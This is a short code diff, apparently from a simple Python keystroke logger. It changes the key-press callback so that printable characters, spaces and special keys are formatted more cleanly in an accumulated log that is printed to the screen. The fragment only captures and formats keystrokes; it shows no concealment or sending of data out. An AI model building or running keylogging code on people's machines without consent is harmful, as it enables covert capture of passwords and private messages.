@@ -9,7 +9,14 @@ log = ""
 
 def process_key_press(key):
     global log
-    log = log + str(key)
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + " "+str(key)+" "
+
     print(log)
 
 
